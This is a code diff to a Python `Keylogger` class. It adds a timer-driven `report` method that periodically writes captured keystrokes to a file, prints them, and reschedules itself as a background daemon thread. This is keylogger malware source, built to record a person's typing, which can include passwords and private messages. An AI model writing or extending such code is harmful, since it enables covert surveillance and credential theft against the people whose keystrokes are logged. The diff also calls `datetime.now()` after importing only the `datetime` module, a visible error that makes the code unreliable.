@@ -1,4 +1,5 @@
 import datetime
+from threading import Timer
 
 class Keylogger:
     def __init__(self, interval=60, reportMethod="file"):
@@ -29,6 +30,26 @@ class Keylogger:
                 name = f"[{name.upper()}]"
 
         self.log += name
+
+    def report(self):
+        """
+            This function gets called every `self.interval`
+            It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.endDatetime = datetime.now()
+            self.updateFilename()
+
+            if self.reportMethod == "file":
+                self.reportToFile()
+            print(f"[{self.filename}] - {self.log}")
+            self.startDatetime = datetime.now()
+        
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
 
     def reportToFile(self):
         """
